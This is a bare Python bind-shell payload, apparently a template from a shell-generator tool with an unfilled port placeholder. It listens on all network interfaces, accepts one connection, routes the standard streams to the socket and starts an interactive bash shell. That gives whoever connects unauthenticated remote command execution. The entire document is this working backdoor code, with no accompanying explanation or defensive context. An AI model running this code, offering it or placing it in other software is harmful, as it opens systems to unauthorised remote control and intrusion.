import socket,subprocess,os

s=socket.socket()
s.bind(("0.0.0.0",{lport}))
s.listen(1)

conn,addr=s.accept()

os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)

subprocess.call(["/bin/bash","-i"])
